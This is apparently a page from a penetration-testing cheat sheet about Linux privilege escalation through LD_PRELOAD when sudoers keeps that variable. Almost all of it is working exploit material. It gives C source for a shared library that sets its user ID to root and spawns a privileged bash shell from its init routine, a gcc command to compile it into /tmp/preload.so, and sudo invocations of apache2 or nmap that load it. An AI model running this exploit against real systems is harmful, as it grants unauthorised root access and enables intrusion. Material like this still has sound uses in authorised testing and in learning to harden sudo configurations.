---
description: >-
  LD_PRELOAD is an environment variable in Unix like systems that allows you to
  specify a list of shared libraries that should be loaded before the standard
  system libraries when a program is executed.
---

# LD\_PRELOAD

By including `env_keep += LD_PRELOAD` in the `sudoers` file, you're specifying that when users execute commands with `sudo`, the `LD_PRELOAD` environment variable will be preserved from their original environment to the elevated environment - so library is loaded.&#x20;

<figure><img src="../../.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>

### Create so library&#x20;

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}

# gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```

### Escalate privilege&#x20;

```bash
sudo LD_PRELOAD=/tmp/preload.so apache2
# or
sudo LD_PRELOAD=/tmp/preload.so nmap
```
